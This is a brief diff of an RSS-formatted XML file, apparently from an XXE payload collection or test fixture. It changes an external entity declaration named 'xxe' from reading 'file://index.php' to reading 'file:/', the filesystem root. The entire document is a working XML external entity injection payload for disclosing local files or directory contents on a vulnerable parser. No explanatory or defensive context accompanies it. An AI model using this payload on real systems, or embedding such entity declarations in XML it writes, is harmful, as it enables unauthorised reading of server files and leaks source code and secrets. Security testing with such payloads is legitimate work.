@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file://index.php" >]>
+<!ENTITY xxe SYSTEM "file:/" >]>
 <rss version="2.0">
 
 <channel>
